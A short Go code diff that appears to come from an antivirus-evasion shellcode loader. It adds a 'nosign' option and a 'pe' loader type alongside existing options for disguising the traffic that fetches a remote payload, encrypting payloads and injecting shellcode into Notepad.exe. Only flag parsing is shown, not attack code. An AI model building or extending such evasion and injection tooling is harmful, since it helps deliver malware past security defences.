@@ -29,6 +29,7 @@ func initialize() {
 	flag.StringVar(&antiAV.hostObfuscator, "ho", "wwww.baidu.com", "远程加载payload.e时,在GET请求头中替换host实现流量混淆")
 	flag.BoolVar(&antiAV.crypt, "e", false, `生成payload.e`)
 	flag.BoolVar(&antiAV.inject, "inject", false, "开启注入模式, shellcode注入到Notepad.exe")
+	flag.BoolVar(&antiAV.nosign, "nosign", false, "关闭签名")
 	flag.Parse()
 
 	if err := antiAV.validate(); err != nil {
@@ -48,6 +49,8 @@ func initialize() {
 func (c *config) validate() error {
 	switch c.loader {
 	case "sc":
+		fallthrough
+	case "pe":
 	default:
 		return fmt.Errorf("not Support Loader: %v", c.loader)
 	}
